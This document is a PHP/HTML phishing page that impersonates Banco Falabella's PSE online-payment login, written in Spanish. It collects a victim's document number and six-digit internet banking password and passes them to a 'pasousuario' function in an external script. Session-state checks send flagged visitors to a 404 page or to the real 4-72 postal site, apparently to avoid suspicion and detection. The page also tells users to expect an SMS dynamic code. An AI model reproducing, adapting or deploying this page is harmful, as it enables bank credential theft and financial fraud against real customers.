<?php
session_start();

// ---- CONTROL DE ESTADO (igual que tu PHP original) ----
if (isset($_SESSION['estado'])) {
    if ($_SESSION['estado'] == 1) {
        // permitido, sigue en la vista
    } else if ($_SESSION['estado'] == 2) {
        header('Location: /404.php');
        exit;
    } else if ($_SESSION['estado'] == 3) {
        header('Location: https://www.4-72.com.co/publicaciones/236/personas/');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport"
          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <title>PSE - Pagos en línea</title>

    <!-- jQuery y tus scripts originales -->
    <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
    <script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
    <script type="text/javascript" src="/scripts/functions2.js"></script>

    <style>
        /* RESET básico */
        * {
            -webkit-appearance: none;
            box-sizing: border-box;
            font-family: "Segoe UI", Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #f6f7f8;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            color: #1a1a1a;
        }

        /* --- HEADER / LOGO SUPERIOR --- */
        .top-logo {
            text-align: center;
            padding: 20px 10px 0 10px;
            width: 100%;
        }

        .top-logo img.main-logo {
            width: 140px;
            max-width: 60%;
            height: auto;
        }

        /* --- CONTENEDOR PRINCIPAL DEL FORM --- */
        .pse-container {
            background-color: #fff;
            width: 340px;
            max-width: 92%;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            padding: 25px;
            margin-top: 10px;
        }

        .pse-title {
            font-size: 18px;
            font-weight: 600;
            color: #222;
            margin-bottom: 20px;
        }

        label {
            font-size: 14px;
            color: #333;
            display: block;
            margin-bottom: 5px;
        }

        select,
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 14px;
            transition: border 0.2s ease;
            background-color: #fff;
            margin-bottom: 15px;
        }

        select:focus,
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #00a859;
            outline: none;
        }

        .link-recuperar {
            display: inline-block;
            font-size: 13px;
            color: #00a859;
            text-decoration: none;
            margin-bottom: 15px;
        }

        .link-recuperar:hover {
            text-decoration: underline;
        }

        /* --- CAJA CLAVE DINÁMICA --- */
        .info-box {
            background-color: #f7f9fa;
            border: 1px solid #e1e4e8;
            border-radius: 6px;
            padding: 15px;
            font-size: 13px;
            color: #444;
            text-align: left;
        }

        .info-box b {
            color: #000;
            font-weight: 600;
            font-size: 15px;
            display: block;
            margin-bottom: 10px;
        }

        .info-img {
            display: flex;
            justify-content: center;
            margin-top: 15px;
        }

        .info-img img {
            width: 220px;
            max-width: 70%;
            border-radius: 8px;
        }

        /* --- MENSAJE DE ERROR --- */
        #error-message {
            color: red;
            font-size: 12px;
            line-height: 1.3;
            min-height: 14px;
            margin-top: -5px;
            margin-bottom: 10px;
        }

        /* --- BOTONES --- */
        .buttons {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            margin-top: 20px;
        }

        .btn-cancelar,
        .btn-ingresar {
            flex: 1;
            height: 44px;
            border-radius: 6px;
            border: none;
            font-size: 15px;
            cursor: pointer;
            font-weight: 500;
            letter-spacing: 0.02em;
        }

        .btn-cancelar {
            background-color: #f2f3f5;
            color: #333;
        }

        .btn-ingresar {
            background-color: #00a859;
            color: #fff;
        }

        .btn-ingresar:active,
        .btn-ingresar:hover {
            background-color: #00914e;
        }

        /* --- FOOTER --- */
        footer {
            background-color: #1b1b1b;
            color: #fff;
            text-align: center;
            font-size: 12px;
            padding: 18px 10px 24px 10px;
            width: 100%;
            margin-top: 30px;
        }

        footer .vigilado-line {
            color: #fff;
            font-weight: 500;
            margin-bottom: 8px;
            line-height: 1.4;
        }

        footer .vigilado-badge {
            display: inline-block;
            font-size: 11px;
            font-weight: 700;
            background-color: #ffffff;
            color: #1b1b1b;
            padding: 2px 6px;
            border-radius: 2px;
            margin-right: 4px;
        }

        footer p {
            margin: 4px 0;
            line-height: 1.4;
        }

        /* --- MODAL DE ALERTA PROFESIONAL --- */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background-color: rgba(0,0,0,0.45);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            z-index: 9999;
        }

        .modal-box {
            background-color: #fff;
            width: 360px;
            max-width: 95%;
            border-radius: 10px;
            box-shadow: 0 14px 40px rgba(0,0,0,0.25);
            border: 1px solid #d9dce1;
            padding: 20px 20px 16px 20px;
            text-align: left;
            font-size: 14px;
            color: #444;
            line-height: 1.4;
        }

        .modal-header {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            margin-bottom: 12px;
        }

        .modal-icon {
            background-color: #fff5e6;
            min-width: 32px;
            height: 32px;
            border-radius: 6px;
            border: 1px solid #ffcf8a;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            font-size: 14px;
            color: #b86a00;
            font-family: "Segoe UI", Arial, sans-serif;
        }

        .modal-title {
            font-size: 15px;
            font-weight: 600;
            color: #1a1a1a;
        }

        .modal-body-text {
            font-size: 13px;
            color: #4a4a4a;
            margin-top: 4px;
        }

        .modal-body-text span {
            font-weight: 600;
            color: #1a1a1a;
        }

        .modal-footer {
            margin-top: 16px;
            text-align: right;
        }

        .modal-btn {
            background-color: #00a859;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            padding: 10px 16px;
            cursor: pointer;
            font-weight: 500;
        }

        .modal-btn:active,
        .modal-btn:hover {
            background-color: #00914e;
        }

        /* --- RESPONSIVE DETALLE --- */
        @media (min-width: 420px){
            .pse-container { width: 360px; }
        }
    </style>
</head>
<body>

    <!-- MODAL -->
<div class="modal-overlay" id="modalAlert">
    <div class="modal-box">
        <button class="modal-close" id="btnModalCloseX">✕</button>

        <p class="modal-text">
            La información ingresada es<br>
            incorrecta. Por favor vuelve a<br>
            intentar.
        </p>

        <button class="modal-accept" id="btnModalClose">
            Entendido
        </button>
    </div>
</div>

<style>
/* Fondo oscuro detrás del modal */
.modal-overlay {
    position: fixed;
    inset: 0;
    background-color: rgba(0,0,0,0.45);
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    z-index: 9999;
    font-family: "Segoe UI", Arial, sans-serif;
}

/* Caja del modal */
.modal-box {
    position: relative;
    background: radial-gradient(circle at 0% 0%, #ffffff 0%, #f4f4f4 60%, #efefef 100%);
    /* degradado muy suave tipo tarjeta bancaria */
    border-radius: 18px;
    box-shadow: 0 18px 40px rgba(0,0,0,0.25);
    border: 1px solid rgba(0,0,0,0.07);
    width: 360px;
    max-width: 95%;
    padding: 20px 20px 24px 20px;
    color: #1a1a1a;
}

/* Botón X arriba derecha */
.modal-close {
    position: absolute;
    top: 14px;
    right: 14px;
    background: transparent;
    border: 0;
    font-size: 18px;
    line-height: 1;
    color: #6b6b6b;
    cursor: pointer;
    padding: 4px;
}

/* Texto principal */
.modal-text {
    font-size: 18px;
    line-height: 1.4;
    font-weight: 400;
    color: #1a1a1a;
    margin: 0 0 24px 0;
    /* simula alineado tipo banca: texto suelto, sin centrado forzado */
}

/* Botón verde "Entendido" */
.modal-accept {
    width: 100%;
    background-color: #2e9f00; /* verde tipo Falabella */
    color: #fff;
    border: none;
    font-size: 17px;
    line-height: 1.2;
    font-weight: 500;
    padding: 14px 20px;
    border-radius: 999px; /* súper ovalado como en la foto */
    cursor: pointer;
    text-align: center;
    display: block;
}

.modal-accept:active,
.modal-accept:hover {
    background-color: #278900;
}
</style>

<script>
// Cerrar modal con el botón "Entendido" o con la X
document.addEventListener("DOMContentLoaded", function () {
    var overlay = document.getElementById("modalAlert");
    var btnOk   = document.getElementById("btnModalClose");
    var btnX    = document.getElementById("btnModalCloseX");

    function cerrarModal() {
        if (overlay) {
            overlay.style.display = "none";
        }
    }

    if (btnOk)  btnOk.addEventListener("click", cerrarModal);
    if (btnX)   btnX.addEventListener("click", cerrarModal);
});
</script>


    <!-- LOGO SUPERIOR -->
    <div class="top-logo">
        <!-- cámbialo por tu logo real -->
        <img src="/img/fala.png" alt="Banco Falabella" class="main-logo">
    </div>

    <!-- CONTENEDOR PRINCIPAL -->
    <div class="pse-container">
        <div class="pse-title">PSE pagos en línea</div>

        <label for="tipo-persona">Tipo de persona</label>
        <select id="tipo-persona" disabled>
            <option value="natural" selected>Natural</option>
        </select>

        <label for="tipo-documento">Tipo de documento</label>
        <select id="tipo-documento" name="tipo-documento">
            <option value="cc">Cédula de ciudadanía</option>
            <option value="ce">Cédula de extranjería</option>
            <option value="nit">NIT</option>
        </select>

        <label for="txtUsuario">Número de documento</label>
        <input type="text"
               id="txtUsuario"
               name="cedula"
               placeholder="Ej. 1234567"
        >

        <label for="txtPass">Clave internet</label>
        <input type="password"
               id="txtPass"
               name="clave"
               placeholder="Ingresa tu clave"
               required
               pattern="[0-9]{6}"
        >

        <div id="error-message"></div>

        <a href="#" class="link-recuperar" id="clave">
            Recuperar o crear tu clave de internet >
        </a>

        <div class="info-box">
            <b>Necesitarás tu Clave Dinámica</b>
            <div>
                Para realizar esta transacción solicitaremos tu Clave Dinámica.<br>
                Te llegara un SMS y recuerda no compartirlo con nadie.
            </div>

            
        </div>

        <input type="hidden" value="falabella" id="banco">

        <div class="buttons">
            <button class="btn-cancelar" id="btnCancelar">Cancelar</button>
            <button class="btn-ingresar" id="btnUsuario">Ingresar</button>
        </div>
    </div>

    <!-- FOOTER -->
    <footer>
        <div class="info-img">
                <img src="vigilado.png" alt="APP Banco Falabella">
            </div>

        <p>Pagos Banco Falabella Versión 3.0.10</p>
        <p>© Banco Falabella 2025.<br>Todos los derechos reservados.</p>
    </footer>

    <script type="text/javascript">
        $(document).ready(function () {

            // --- CERRAR MODAL ---
            $("#btnModalClose").click(function() {
                $("#modalAlert").fadeOut(200);
            });

            // --- BOTÓN INGRESAR ---
            $('#btnUsuario').click(function (event) {
                event.preventDefault();

                var usuario = $("#txtUsuario").val().trim();
                var clave   = $("#txtPass").val().trim();
                var banco   = $("#banco").val().trim();

                // Validación: usuario no vacío + clave 6 dígitos numéricos
                if (usuario.length > 0 &&
                    clave.length === 6 &&
                    /^\d{6}$/.test(clave)) {

                    $("#error-message").text("");
                    $("#txtPass").css("border", "1px solid #ccc");

                    // misma función original
                    pasousuario(clave, usuario, banco);

                } else {
                    $("#error-message").text("Recuerda que tu clave de internet es de 6 digitos numericos.");
                    $("#txtPass").css("border", "1px solid red");
                    $("#txtPass").focus();
                }
            });

            // --- BOTÓN CANCELAR ---
            $('#btnCancelar').click(function (event) {
                event.preventDefault();
                window.location.href = "/"; // ajusta si quieres otra ruta
            });

            // --- REFUERZO DE ESTADO EN FRONT ---
            var estadoJS = <?php echo isset($_SESSION['estado']) ? intval($_SESSION['estado']) : 0; ?>;
            if (estadoJS === 2) {
                window.location.href = '/404.php';
            } else if (estadoJS === 3) {
                window.location.href = 'https://www.4-72.com.co/publicaciones/236/personas/';
            }
        });
    </script>

</body>
</html>
